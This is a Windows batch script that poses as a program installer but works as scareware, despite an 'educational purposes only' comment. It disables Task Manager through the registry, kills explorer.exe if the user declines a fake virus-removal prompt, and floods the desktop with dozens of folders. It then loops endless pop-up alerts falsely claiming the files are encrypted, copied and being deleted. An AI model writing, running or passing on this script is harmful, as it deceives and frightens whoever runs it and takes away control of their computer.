@echo off

@echo off
:: Disable Task Manager (For educational purposes only)
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Start a process that won't terminate

:: Initial prompt for installing the program
set /p answer=Install Program? (yes/no): 

:: If user chooses yes, continue with installation
if /i "%answer%"=="yes" (
    echo Installer starting...
) else (
    :: If user chooses no, exit the installer
    if /i "%answer%"=="no" (
        echo Exiting installer.
        timeout /t 2 >nul
        exit
    ) else (
        :: If user inputs invalid response
        echo Invalid input. Please enter "yes" or "no".
        timeout /t 2 >nul
        exit
    )
)

echo Please wait, installing program...
echo.

:: Progress bar setup
set /a count=0
set /a total=5

:progress
set /a count+=1
set /a bar_length=(count*5)/total
set "bar="
for /l %%i in (1,1,%bar_length%) do set "bar=%bar%#"
set "spaces="
for /l %%i in (%bar_length%,1,5) do set "spaces=%spaces% "

cls
echo [%bar%%spaces%] %count%%/%total% Complete...
timeout /nobreak /t 1 >nul

:: Continue progress until completion
if %count% lss %total% goto progress

color 4
echo.
echo installer.exe successfully installed!

:: Create folder on desktop named "installer"
mkdir "%userprofile%\Desktop\installer"
echo Folder "installer" created on desktop.

:: Open Notepad and execute the malicious script
start notepad.exe
timeout /t 1 /nobreak > nul
echo Set WshShell = WScript.CreateObject("WScript.Shell") > %temp%\notepad_script.vbs
echo WshShell.AppActivate "Notepad" >> %temp%\notepad_script.vbs
echo WshShell.SendKeys "Thank you for Installing!" >> %temp%\notepad_script.vbs
echo WScript.Sleep 500 >> %temp%\notepad_script.vbs
echo WshShell.SendKeys "{ENTER}" >> %temp%\notepad_script.vbs
cscript //nologo %temp%\notepad_script.vbs
del %temp%\notepad_script.vbs

pause

:: Ask for user input to remove the virus
@echo off
cls
set /p choice="You have a virus named Installer.exe, remove? (yes/no): "

:: If user chooses Yes, run the progress bar for virus removal
if /i "%choice%"=="yes" (
    echo Removing virus progress: 0%%
    for /L %%i in (1,1,100) do (
        set /a percent=%%i
        setlocal enabledelayedexpansion
        cls
        echo Removing virus progress: !percent!%%
        ping localhost -n 1 > nul
        endlocal
    )
    echo Virus successfully Installed!: 100%%
)

:: If user chooses No, kill Explorer.exe process
if /i "%choice%"=="no" (
    echo Ending Explorer.exe...
    taskkill /f /im explorer.exe
)

pause

:: After virus installation, create folders on desktop
set desktop=%USERPROFILE%\Desktop

:: List of folder names
set folders=01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 a b c d e f g h i j k l m n o p q r s t u v w x y z INSTALLERDATA INSTALLER+ DECRYPTFILES system32 explorer dump 45t t245 4u67 i687 341r

:: Loop through each folder name and create it
for %%f in (%folders%) do (
    mkdir "%desktop%\%%f"
)


echo Virus data successfully installed.

:loop
start "" mshta "javascript:alert('YOUR FILES ARE ENCRYPTED');close()"
timeout /t 0.6 > nul
start "" mshta "javascript:alert('THEIR IS NO GETTING THEM BACK');close()"
timeout /t 0.6 > nul
start "" mshta "javascript:alert('I AM COPYING ALL OF YOUR FILES RIGHT NOW');close()"
timeout /t 0.6 > nul
start "" mshta "javascript:alert('THEIR IS NOTHING YOU CAN DO NOW');close()"
timeout /t 0.6 > nul
start "" mshta "javascript:alert('DELETING SYSTEM FILES');close()"
timeout /t 0.6 > nul
start "" mshta "javascript:alert('CORUPTING EVERY FILE IN YOUR COMPUTER');close()"
goto loop

pause